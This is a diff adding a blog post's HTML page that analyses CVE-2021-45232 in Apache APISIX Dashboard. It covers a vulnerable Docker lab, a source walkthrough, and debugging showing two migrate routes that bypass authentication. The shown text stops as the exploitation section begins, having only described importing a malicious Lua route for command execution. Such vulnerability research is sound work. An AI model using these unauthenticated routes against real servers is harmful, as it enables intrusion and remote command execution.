@@ -1,0 +1,918 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>CVE-2021-45232: Apache APISIX Dashboard Unauthorized Access &amp; Unauth-RCE - Zeyad Azima</title>
+<meta name="description" content="Detailed analysis for CVE-2021-45232, an Unauthorized Access vulnerability in apache apisix &amp; how it can be used to achieve RCE. ">
+
+
+  <meta name="author" content="Zeyad Azima">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Zeyad Azima">
+<meta property="og:title" content="CVE-2021-45232: Apache APISIX Dashboard Unauthorized Access &amp; Unauth-RCE">
+<meta property="og:url" content="http://localhost:5000/security%20research/CVE_2021_45232/">
+
+
+  <meta property="og:description" content="Detailed analysis for CVE-2021-45232, an Unauthorized Access vulnerability in apache apisix &amp; how it can be used to achieve RCE. ">
+
+
+
+  <meta property="og:image" content="http://localhost:5000/assets/images/clhc9my2s6ttg0jmr3ix23phb.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-05-09T00:00:00+08:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:5000/security%20research/CVE_2021_45232/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Zeyad Azima",
+      "url": "http://localhost:5000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Zeyad Azima Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/site_data/logo.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          Zeyad Azima
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/#Security-Research">Security Research</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#MacOS">MacOS</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#IoT-Exploitation">IoT Exploitation</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#Defense-Evasion">Defense Evasion</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#General">General</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#Certificates">Certificates</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories">All Categories</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/site_data/avatar.jpg" alt="Zeyad Azima" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Zeyad Azima</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Brain Storming Stuff (Exploit Development, Reverse Engineering &amp; More)</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="mailto:contact@zeyadazima.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/AzimaZeyad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/zer0verflow/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/Zeyad-Azima" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://www.buymeacoffee.com/zeyadazima" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i><span class="label">Buy Me a Coffee</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="CVE-2021-45232: Apache APISIX Dashboard Unauthorized Access &amp; Unauth-RCE">
+    <meta itemprop="description" content="Introduction">
+    <meta itemprop="datePublished" content="2023-05-09T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">CVE-2021-45232: Apache APISIX Dashboard Unauthorized Access &amp; Unauth-RCE
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  15 minute read
+
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#what-is-apisix-">What is APISIX ?</a></li>
+  <li><a href="#testing-lab">Testing Lab</a></li>
+  <li><a href="#static-analysis">Static Analysis</a></li>
+  <li><a href="#dynamic-analysis">Dynamic Analysis</a></li>
+  <li><a href="#exploitation">Exploitation</a></li>
+  <li><a href="#patch-diffing">Patch Diffing</a></li>
+  <li><a href="#conclusion">Conclusion</a></li>
+  <li><a href="#resources">Resources</a></li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="introduction"><strong>Introduction</strong></h1>
+
+<p>Apache <code class="language-plaintext highlighter-rouge">APISIX</code> Dashboard before <code class="language-plaintext highlighter-rouge">2.10.1</code> is vulnerable to Unauthorized Access Vulnerability known as <code class="language-plaintext highlighter-rouge">CVE-2021-45232</code>, The authentication middleware was developed based on the <code class="language-plaintext highlighter-rouge">droplet</code> framework. But, some <code class="language-plaintext highlighter-rouge">APIs</code> used the <code class="language-plaintext highlighter-rouge">gin</code> framework directly as a results it leads for a bypass in authentication &amp; a successfully exploitation for this vulnerability let the attacker to abuse the support of executing <code class="language-plaintext highlighter-rouge">lua</code> script to execute commands on the server.</p>
+
+<h1 id="what-is-apisix-"><strong>What is APISIX ?</strong></h1>
+
+<p>Apache <code class="language-plaintext highlighter-rouge">APISIX</code> is a cloud native API gateway that provides high-performance and scalable API management solutions. It is built on top of the <code class="language-plaintext highlighter-rouge">Nginx</code> web server and provides a simple and flexible architecture for managing and securing APIs. The <code class="language-plaintext highlighter-rouge">APISIX</code> Dashboard is a web based user interface for managing and monitoring <code class="language-plaintext highlighter-rouge">APISIX</code> instances. It provides an intuitive and easy-to-use interface for configuring <code class="language-plaintext highlighter-rouge">APIs</code>, <code class="language-plaintext highlighter-rouge">plugins</code>, and <code class="language-plaintext highlighter-rouge">routes</code>, as well as monitoring API usage and performance.</p>
+
+<h1 id="testing-lab"><strong>Testing Lab</strong></h1>
+
+<p>Now, It’s time to set up our lab for the analysis, I am going to use an older version for the analysis which is <code class="language-plaintext highlighter-rouge">2.9.0</code> as it’s vulnerable. We can see that apache has an official repo on <code class="language-plaintext highlighter-rouge">github</code> to run <code class="language-plaintext highlighter-rouge">APISIX</code> on <code class="language-plaintext highlighter-rouge">docker</code> and here we can avoid building errors and problems. First, Clone into the repo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/apache/apisix-docker
+</code></pre></div></div>
+
+<p>After that, Navigate to <code class="language-plaintext highlighter-rouge">example</code> folder inside <code class="language-plaintext highlighter-rouge">apisix-docker</code> folder. Then, Open the <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> file and replace the <code class="language-plaintext highlighter-rouge">apisix-dashboard</code> image with the following image:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apache/apisix-dashboard:2.9.0
+</code></pre></div></div>
+
+<p>Full example :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>version: "3"
+
+services:
+  apisix-dashboard:
+    image: apache/apisix-dashboard:2.9.0
+    restart: always
+    volumes:
+    - ./dashboard_conf/conf.yaml:/usr/local/apisix-dashboard/conf/conf.yaml
+    ports:
+    - "9000:9000"
+    networks:
+      apisix:
+</code></pre></div></div>
+
+<p>After that inside the <code class="language-plaintext highlighter-rouge">example</code> folder run the following command to start our <code class="language-plaintext highlighter-rouge">apisix</code> on docker:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker-compose -p docker-apisix up -d
+</code></pre></div></div>
+
+<p><img src="/assets/images/505ef4cc887a271356a6fddf0f68ed20" alt="" /></p>
+
+<p>As it’s done let’s check the running <code class="language-plaintext highlighter-rouge">process</code> on <code class="language-plaintext highlighter-rouge">docker</code>:</p>
+
+<p><img src="/assets/images/3636cc82b4dc0bbd5807ffe1568d6b2b" alt="" /></p>
+
+<p>Now, Let’s test if it works <code class="language-plaintext highlighter-rouge">[IP]:9000/</code> for the <code class="language-plaintext highlighter-rouge">APISIX</code> dashboard &amp; <code class="language-plaintext highlighter-rouge">[IP]:9080/</code> for the <code class="language-plaintext highlighter-rouge">APISIX</code>.</p>
+
+<ul>
+  <li>
+    <p>Dashboard</p>
+
+    <p><img src="/assets/images/fa88520f9d9ad3b9c839b571971c29bd" alt="" /></p>
+  </li>
+  <li>
+    <p>APISIX</p>
+
+    <p><img src="/assets/images/b7f32e78ee470c29efd891b0935dfb14" alt="" /></p>
+  </li>
+</ul>
+
+<h1 id="static-analysis"><strong>Static Analysis</strong></h1>
+
+<p>Under the <code class="language-plaintext highlighter-rouge">api</code> folder in the source code, We can see the <code class="language-plaintext highlighter-rouge">main.go</code> which is the start of the <code class="language-plaintext highlighter-rouge">dashboard</code> app, By opening it we can see the following:</p>
+
+<p><img src="/assets/images/919daf1cf398f86df286bb6908a18f7e" alt="" /></p>
+
+<p>We can notice here it’s importing the <code class="language-plaintext highlighter-rouge">cmd</code> module from the <code class="language-plaintext highlighter-rouge">manager-api</code> package which is the <code class="language-plaintext highlighter-rouge">cmd</code> folder under the same folder, Then, It calls <code class="language-plaintext highlighter-rouge">Execute()</code> function from <code class="language-plaintext highlighter-rouge">cmd</code>. Therefore, We need to go to the <code class="language-plaintext highlighter-rouge">cmd</code> folder and check the <code class="language-plaintext highlighter-rouge">Execute()</code> function.</p>
+
+<p><img src="/assets/images/b5598fa05e34465bd7a12cc962d0c10d" alt="" /></p>
+
+<p>After going through the files we can see the <code class="language-plaintext highlighter-rouge">Execute()</code> function is in <code class="language-plaintext highlighter-rouge">root.go</code>. And basically, It’s executing <code class="language-plaintext highlighter-rouge">rootCmd.Execute()</code> and check if there is any errors returned to handle it. When we search for the <code class="language-plaintext highlighter-rouge">rootCmd</code>.</p>
+
+<p><img src="/assets/images/ac8e582bbdc8df5ed1b53e61f1d92916" alt="" /></p>
+
+<p>We can see clearly that <code class="language-plaintext highlighter-rouge">rootCmd</code> is a variable definition of a <code class="language-plaintext highlighter-rouge">CLI</code> from <code class="language-plaintext highlighter-rouge">Cobra</code> library which is a command-line library for <code class="language-plaintext highlighter-rouge">Go</code> and It provides a simple &amp; efficient way to create modern <code class="language-plaintext highlighter-rouge">CLI</code> applications that can handle commands, flags, and arguments. The <code class="language-plaintext highlighter-rouge">&amp;cobra.Command</code> function creates a new command with the specified options as the following:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Use</code>: It’s a field specifies the name and usage of the command.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Short</code>: It’s a field that provides a brief description of the command.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">RunE</code>: it’s field of a function that gets called when the command is executed, In our case the function it takes argument and gonna execute the <code class="language-plaintext highlighter-rouge">manageAPI()</code> function.</p>
+  </li>
+</ul>
+
+<p>When we scroll down more under the <code class="language-plaintext highlighter-rouge">Init()</code> function, We can see the following lines:</p>
+
+<p><img src="/assets/images/d73c3c0987eb3bbb544b8803d16a07b4" alt="" /></p>
+
+<p>We can see it’s adding persistent flags to the <code class="language-plaintext highlighter-rouge">rootCmd</code> and registering several sub-commands (<code class="language-plaintext highlighter-rouge">Also can called functions</code>) with it as the following:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">newVersionCommand()</code>: which adds a <code class="language-plaintext highlighter-rouge">version</code> sub-command</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">newInstallCommand()</code>: which adds an <code class="language-plaintext highlighter-rouge">install</code> sub-command</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">newRemoveCommand()</code>: which adds a <code class="language-plaintext highlighter-rouge">remove</code> sub-command</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">newStartCommand()</code>: which adds a <code class="language-plaintext highlighter-rouge">start</code> sub-command</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">newStopCommand()</code>: which adds a <code class="language-plaintext highlighter-rouge">stop</code> sub-command</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">newStatusCommand()</code>: which adds a <code class="language-plaintext highlighter-rouge">status</code> sub-command</p>
+  </li>
+</ul>
+
+<p>And all of these added sub-commands are added from the files under the same directory as we can see:</p>
+
+<p><img src="/assets/images/b72368eead4b8ffbec827a02ed7b5b0d" alt="" /></p>
+
+<p>Now, Let’s go to the function that gets executed when we running the <code class="language-plaintext highlighter-rouge">rootCmd</code> which is the <code class="language-plaintext highlighter-rouge">manageAPI()</code> function:</p>
+
+<p><img src="/assets/images/39010f6d836a4ff7f6ef30e358161bb5" alt="" /></p>
+
+<p>Now, Let’s explain the function. First, it initializes the configuration and logger by calling the <code class="language-plaintext highlighter-rouge">conf.InitConf()</code> and <code class="language-plaintext highlighter-rouge">log.InitLogger()</code> functions. Then, it creates a new <code class="language-plaintext highlighter-rouge">server</code> object using the <code class="language-plaintext highlighter-rouge">server.NewServer()</code> function and assign it to the <code class="language-plaintext highlighter-rouge">s</code> variable which is a <code class="language-plaintext highlighter-rouge">server</code> type and <code class="language-plaintext highlighter-rouge">err</code> variable for <code class="language-plaintext highlighter-rouge">error</code> &amp; passing in options that include whether to force start the server or not. After that, The server is then started by calling the <code class="language-plaintext highlighter-rouge">s.Start()</code> function, which creates a <code class="language-plaintext highlighter-rouge">go routine</code> and listens for incoming <code class="language-plaintext highlighter-rouge">HTTP</code> requests and then sets up a quit channel that listens for an interrupt signal and if received, it stops the server gracefully by calling the <code class="language-plaintext highlighter-rouge">s.Stop()</code> function and exits the program &amp; If an error occurs during server startup the function logs the error and returns it. Now, When we go up to the imports line we can notice the following:</p>
+
+<p><img src="/assets/images/7f6769d5fe6947573733e3d7c37169bf" alt="" /></p>
+
+<p>That the <code class="language-plaintext highlighter-rouge">server</code> is implemented from <code class="language-plaintext highlighter-rouge">api/internal/core/server/server.go</code>. Let’s take a look on it:</p>
+
+<p><img src="/assets/images/dca4cbab50da6e4e7a47c25857420937" alt="" /></p>
+
+<p>After the <code class="language-plaintext highlighter-rouge">imports</code> of needed modules, we can see it defines a <code class="language-plaintext highlighter-rouge">struct</code> of <code class="language-plaintext highlighter-rouge">server</code> type and it defines the <code class="language-plaintext highlighter-rouge">HTTP</code> server and its associated options. Then, The <code class="language-plaintext highlighter-rouge">Options</code> struct is used to specify the configuration options for the server. After that a function named <code class="language-plaintext highlighter-rouge">NewServer</code> that creates a new server manager by taking an instance of the <code class="language-plaintext highlighter-rouge">Options</code> struct as input and return a pointer to a server struct and an error.</p>
+
+<p><img src="/assets/images/fcc23ab44efddcd0c705ed2415a2f41e" alt="" /></p>
+
+<p>In the following lines, We can see the <code class="language-plaintext highlighter-rouge">Start()</code> function that called before inside the <code class="language-plaintext highlighter-rouge">mangerAPI()</code> function.</p>
+
+<p><img src="/assets/images/3038e7890589e1701dc3707d3caa8b38" alt="" /></p>
+
+<p>the <code class="language-plaintext highlighter-rouge">Start()</code> function starts with initializing the server through <code class="language-plaintext highlighter-rouge">s.init()</code> and assign the error to <code class="language-plaintext highlighter-rouge">err</code> object &amp; if there is an error it will immediately assign it to <code class="language-plaintext highlighter-rouge">errSig</code> and exit. Now, After the server initialized it will print server info using <code class="language-plaintext highlighter-rouge">s.printInfo()</code>, Then starts the <code class="language-plaintext highlighter-rouge">HTTP</code> server through <code class="language-plaintext highlighter-rouge">s.server.ListenAndServe()</code> &amp; Then it will start the <code class="language-plaintext highlighter-rouge">HTTP</code> Server implemented with the <code class="language-plaintext highlighter-rouge">SSL</code> if it’s configured. Moving to the following lines we will be able to see the following 2 functions:</p>
+
+<p><img src="/assets/images/7c82758e4ef67c793b78bcb625ff6c0a" alt="" /></p>
+
+<p>First, Which is <code class="language-plaintext highlighter-rouge">Stop()</code> function and basically it will close the opened connections &amp; then shutdown the server. And second, <code class="language-plaintext highlighter-rouge">init()</code> function which is important for us, In the function it calls <code class="language-plaintext highlighter-rouge">s.SetupStore()</code> which is responsible for managing data persistence for the Manager API and it can be found in <code class="language-plaintext highlighter-rouge">store.go</code> file under the same folder and it’s just initializing the <code class="language-plaintext highlighter-rouge">Store</code>. Second, the <code class="language-plaintext highlighter-rouge">init()</code> function also calls the <code class="language-plaintext highlighter-rouge">s.setupAPI()</code> and we can find the <code class="language-plaintext highlighter-rouge">setupAPI()</code> function inside the <code class="language-plaintext highlighter-rouge">http.go</code> file under the same folder:</p>
+
+<p><img src="/assets/images/e9f7e9aa1636c4f5d0f1b4848c78b618" alt="" /></p>
+
+<p>Here the <code class="language-plaintext highlighter-rouge">droplet</code> framework is used, <code class="language-plaintext highlighter-rouge">droplet.Option.Orchestrator</code> function takes a slice of middleware and returns a new slice of middleware that will be used in the order specified. the first middleware in the slice of middleware passed in. Then the <code class="language-plaintext highlighter-rouge">handler.ErrorTransformMiddleware{}</code> middleware that transforms all errors returned by handlers to the standard API error format. Finally, the <code class="language-plaintext highlighter-rouge">filter.AuthenticationMiddleware{}</code> middleware that authenticates requests based on the access token in the <code class="language-plaintext highlighter-rouge">Authorization</code> header. and by defining the middleware in this way, it ensures that error transformation and authentication will be performed before any other middleware processing. So, for the following examples we gonna see how the wrong implementation done:</p>
+
+<ul>
+  <li>
+    <p>1st:</p>
+
+    <p><img src="/assets/images/ee61b72beb2cd7765cfd947ed04c98ac" alt="" /></p>
+  </li>
+  <li>
+    <p>2nd:</p>
+
+    <p><img src="/assets/images/833ff9b6cb5dfe2956b4d3c11ce692d4" alt="" /></p>
+  </li>
+</ul>
+
+<p>In the <code class="language-plaintext highlighter-rouge">1st</code> screenshot we can see that it’s <code class="language-plaintext highlighter-rouge">wgin.Wraps()</code> to wrap the function with the <code class="language-plaintext highlighter-rouge">middleware</code> so it can it check that error transformation and authentication will be performed before any other middleware processing. But, In the second screenshot it’s not wrapping the function with the middleware. As a result we can get unauthorized access to these 2 routes which are <code class="language-plaintext highlighter-rouge">/apisix/admin/migrate/export</code> &amp; <code class="language-plaintext highlighter-rouge">/apisix/admin/migrate/import</code>. Let’s try to access a route from the wrapped ones and access the non-wrapped ones to se how the application will deal with it.</p>
+
+<ul>
+  <li>
+    <p>Wrapped</p>
+
+    <p><img src="/assets/images/49d985af57ef25c7e1d39fda70fb9d3c" alt="" /></p>
+  </li>
+  <li>
+    <p>Non-Wrapped</p>
+
+    <p><img src="/assets/images/7af5108642d39a96b9befec5c25323de" alt="" /></p>
+  </li>
+</ul>
+
+<p>Here we can see clearly that the <code class="language-plaintext highlighter-rouge">wrapped</code> one give us a response that we are unauthorized. BUt, the second one which is <code class="language-plaintext highlighter-rouge">/apisix/admin/migrate/export</code> route exported us the current configuration of <code class="language-plaintext highlighter-rouge">APISIX</code>.</p>
+
+<h1 id="dynamic-analysis"><strong>Dynamic Analysis</strong></h1>
+
+<p>Now, It’s time for dynamic analysis. First, for debugging go applications we need to download <code class="language-plaintext highlighter-rouge">delve</code> debugger. You can follow the installation guide from <a href="https://github.com/go-delve/delve/tree/master/Documentation/installation">here</a>. Let’s now build the dashboard on our local machine to debug it. First we would need the following packages before we start building <code class="language-plaintext highlighter-rouge">golang-go</code>, <code class="language-plaintext highlighter-rouge">yarn</code>, <code class="language-plaintext highlighter-rouge">nodejs</code>, <code class="language-plaintext highlighter-rouge">etcd</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install golang-go yarn nodejs
+</code></pre></div></div>
+
+<p>And for installing <code class="language-plaintext highlighter-rouge">ectd</code> follow the installation guide from <a href="https://etcd.io/docs/v3.4/install/">here</a>. After the packages get installed let’s download our vulnerable version:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone -b release/2.9.0 https://github.com/apache/apisix-dashboard.git &amp;&amp; cd apisix-dashboard
+</code></pre></div></div>
+
+<p>After that run the following command <code class="language-plaintext highlighter-rouge">sudo make build</code> to build the app dashboard. After it’s finished Let’s go to <code class="language-plaintext highlighter-rouge">output</code> directory:</p>
+
+<p><img src="/assets/images/1d4a5b17b39d368d99530b849c1164eb" alt="" /></p>
+
+<p>We can see the <code class="language-plaintext highlighter-rouge">manager-api</code> which is the dashboard app. Now, It’s time to execute the app using <code class="language-plaintext highlighter-rouge">delve</code> to debug it remote;y from our <code class="language-plaintext highlighter-rouge">GoLand</code> IDE. You can find <code class="language-plaintext highlighter-rouge">delve</code> binary under the <code class="language-plaintext highlighter-rouge">go/bin</code> directory under your linux user home. Let’s run <code class="language-plaintext highlighter-rouge">delve</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /home/kali/go/bin/dlv -l=:2345 --headless=true --api-version=2 --log=true exec ./manager-api
+</code></pre></div></div>
+
+<p>Here we run <code class="language-plaintext highlighter-rouge">delve</code> to execute the app and listen for debugging session on port <code class="language-plaintext highlighter-rouge">2345</code> as we can see:</p>
+
+<p><img src="/assets/images/35ba9a7d00ae4960f26b704dc17e141b" alt="" /></p>
+
+<p>Now, Let’s connect to the debugger session on our IDE, go to <code class="language-plaintext highlighter-rouge">Run</code> Tab and then click on <code class="language-plaintext highlighter-rouge">Edit Configurations</code>:</p>
+
+<p><img src="/assets/images/b806b473d338278a5467104a2d2b5a12" alt="" /></p>
+
+<p>Then Click on the <code class="language-plaintext highlighter-rouge">+</code> add sign and choose <code class="language-plaintext highlighter-rouge">Go Remote</code>:</p>
+
+<p><img src="/assets/images/3a950243e6c9972efc1b1923b3573d96" alt="" /></p>
+
+<p>And Name it as you want &amp; configure the remote debugger, By adding the machine <code class="language-plaintext highlighter-rouge">IP</code>, Debugging port which is <code class="language-plaintext highlighter-rouge">2345</code>:</p>
+
+<p><img src="/assets/images/507eceecac814bd034b0bd574afab99d" alt="" /></p>
+
+<p>Now, Click on <code class="language-plaintext highlighter-rouge">OK</code> and you can see that our remote debugger is configured:</p>
+
+<p><img src="/assets/images/92b32a966604ab4b45f24cc05f9934a8" alt="" /></p>
+
+<p>It’s time to set a breakpoints, First we will set a breakpoint to the <code class="language-plaintext highlighter-rouge">wrapped</code> route and take a look how the app deal with it &amp; then the <code class="language-plaintext highlighter-rouge">un-wrapped</code> one to see the difference.</p>
+
+<p><img src="/assets/images/d3e4540d9879c8f4b8267b84db3f7c29" alt="" /></p>
+
+<p>As we can see our debugger is running, Let’s debug our code and see how it will apply route for each one. While we stepping over under the <code class="language-plaintext highlighter-rouge">r</code> which is a pointer for <code class="language-plaintext highlighter-rouge">route</code> we can see <code class="language-plaintext highlighter-rouge">tress</code> which is <code class="language-plaintext highlighter-rouge">gin.methoidTrees</code>:</p>
+
+<p><img src="/assets/images/43c916f9b6ec027a82587de336522fdd" alt="" /></p>
+
+<p>Under it we can see integer values and each number is carrying all the different routes according to the methods</p>
+
+<p><img src="/assets/images/c9b66831e2f7feb2cb4e28eac50de5cc" alt="" /></p>
+
+<p>Here we can see see that each the 5 <code class="language-plaintext highlighter-rouge">HTTP</code> methods are exist and under the <code class="language-plaintext highlighter-rouge">root</code> of each one, We can see the <code class="language-plaintext highlighter-rouge">children</code> tab which contains the exact routes:</p>
+
+<p><img src="/assets/images/8a209c5e59830ae857724d09e58f9302" alt="" /></p>
+
+<p>Here we can see the routes also stored inside it. Now, As we saw the way of <code class="language-plaintext highlighter-rouge">ApplyRoute</code> and how it’s applying routes to initialize it, Let’s see how the difference between the <code class="language-plaintext highlighter-rouge">wrapped</code> route and <code class="language-plaintext highlighter-rouge">un-wrapped</code> route on the loading. But, This time we will add the breakpoint under the <code class="language-plaintext highlighter-rouge">Wrap</code> function from the <code class="language-plaintext highlighter-rouge">gin</code> framework:</p>
+
+<p><img src="/assets/images/dfde035d844b316319a55d10d2c07c8c" alt="" /></p>
+
+<p>After setting our breakpoint let’s run our debugger again and moving step by step until we arrive to the <code class="language-plaintext highlighter-rouge">Wrap</code> function.</p>
+
+<p><img src="/assets/images/43fcdcb967ecfcbbb3e0034c6fb4072c" alt="" /></p>
+
+<p>Here as we can see when the breakpoint of the <code class="language-plaintext highlighter-rouge">Wraps</code> funtion got hit it started to <code class="language-plaintext highlighter-rouge">Wraps</code> it and apply the middleware to it and as the following 2 routes are not <code class="language-plaintext highlighter-rouge">Wrapped</code> the authentication can be bypassed as it’s gonna apply and execute it without <code class="language-plaintext highlighter-rouge">wrapping</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r.GET("/apisix/admin/migrate/export", h.ExportConfig)
+r.POST("/apisix/admin/migrate/import", h.ImportConfig)
+</code></pre></div></div>
+
+<h1 id="exploitation"><strong>Exploitation</strong></h1>
+
+<p>Now, How the vulnerable routes can be exploited ?. As we mentioned before that the <code class="language-plaintext highlighter-rouge">/apisix/admin/migrate/export</code> used to export the current configurations, The <code class="language-plaintext highlighter-rouge">/apisix/admin/migrate/import</code> used to import configurations. And <code class="language-plaintext highlighter-rouge">APISIX</code> is supporting execution of <code class="language-plaintext highlighter-rouge">lua</code> scripts then, we can send a request of a malicious route that executes a command then request it. The configuration file is as the following:</p>
+
+<p><img src="/assets/images/cc29035b024f7a8d1bb2ed6271cb62f0" alt="" /></p>
+
